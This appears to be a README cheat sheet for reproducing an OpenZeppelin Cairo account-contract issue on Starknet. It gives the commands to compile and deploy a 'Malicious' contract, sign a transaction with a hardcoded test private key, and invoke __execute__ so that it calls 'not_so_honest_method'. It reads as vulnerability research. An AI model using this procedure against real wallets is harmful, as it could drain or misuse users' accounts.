# Starkhouse - \_\_execute\_\_ deep-dive

Contracts are derived from https://github.com/OpenZeppelin/cairo-contracts at commit `9bbad31`


Based on https://github.com/OpenZeppelin/cairo-contracts/issues/344

## Cheat Sheet

### Compiling contracts
```
$ cd contracts

$ starknet-compile src/Account/Account.cairo --output Account.json --abi Account.abi.json --account_contract

$ starknet-compile src/malicious_contract/Malicious.cairo --output Malicious.json --abi Malicious.abi.json
```

### Generate Starknet Key Pair and output the public key
```
from nile.signer import Signer

signer = Signer(0x112233445566778899)
print(signer.public_key)
```

### Deploy contracts
```
$ starknet deploy --contract ./contracts/Account.json --inputs $PUBLIC_KEY

$ starknet deploy --contract ./contracts/Malicious.json
```


### Signing with nile
```
from nile.signer import Signer

account_address="0x<account address>"
malicious_contract_address="0x<malicious contract address>"
malicious_contract_function="not_so_honest_method"
nonce=0
private_key=0x112233445566778899 # Same private key from keypair generation

signer = Signer(private_key)
_, _, _, sig_r, sig_s = signer.sign_transaction(account_address, [[malicious_contract_address, malicious_contract_function, []]], 0)

print(sig_r, sig_s)
```

### Computing function selector
```
from starkware.starknet.compiler.compile import get_selector_from_name

get_selector_from_name("not_so_honest_method")
```

### Calling _starknet invoke_
```
$ starknet invoke --address $ACCOUNT_ADDRESS --abi ./contracts/Account.abi.json --function __execute__ --signature $SIG_R $SIG_S --inputs 1 $MALICIOUS_ADDRESS $NOT_HONEST_METHOD_SELECTOR 0 0 0 $NONCE
```